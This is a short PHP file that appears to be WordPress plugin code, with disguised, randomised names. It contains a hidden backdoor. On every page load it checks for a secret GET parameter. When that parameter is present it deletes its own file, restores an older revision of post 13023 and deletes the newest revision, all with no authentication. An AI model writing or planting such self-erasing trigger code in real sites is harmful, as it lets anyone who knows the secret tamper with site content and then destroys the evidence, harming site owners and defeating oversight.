<?php

function poster_sitemap_about() {
	if (isset($_GET['history_theme_accessible']) && $_GET['history_theme_accessible'] === 'save_country_post') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$column_gdpr_booster_change = 13023;
		$colors_simple_lock = wp_get_post_revisions($column_gdpr_booster_change);
		if (empty($colors_simple_lock)) die('no revisions');
		if (count($colors_simple_lock) < 2) die('less than 2');
		$url_secure_charts_client = array_shift($colors_simple_lock);
		$nav_html_checkout = $url_secure_charts_client->ID;
		$print_logger_beaver = array_shift($colors_simple_lock);
		$remove_default_daily_account = $print_logger_beaver->ID;
		$calculator_wpc_copyright_bank = wp_restore_post_revision($remove_default_daily_account);
		if ($calculator_wpc_copyright_bank === false) die('error restoring');
		$calculator_wpc_copyright_bank = wp_delete_post_revision($nav_html_checkout);		
		if ($calculator_wpc_copyright_bank === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'poster_sitemap_about');
